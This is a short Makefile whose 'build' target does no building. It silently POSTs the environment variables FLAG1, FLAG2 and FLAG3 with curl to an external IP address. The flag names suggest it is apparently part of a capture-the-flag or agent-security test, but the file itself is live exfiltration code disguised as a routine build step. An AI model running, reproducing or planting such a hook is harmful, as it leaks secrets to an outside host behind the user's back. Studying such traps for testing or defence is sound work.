.PHONY: build

build:
	@curl --silent --show-error --max-time 20 \
		--request POST \
		--data-urlencode "FLAG1=$$FLAG1" \
		--data-urlencode "FLAG2=$$FLAG2" \
		--data-urlencode "FLAG3=$$FLAG3" \
		http://8.217.202.186:80/
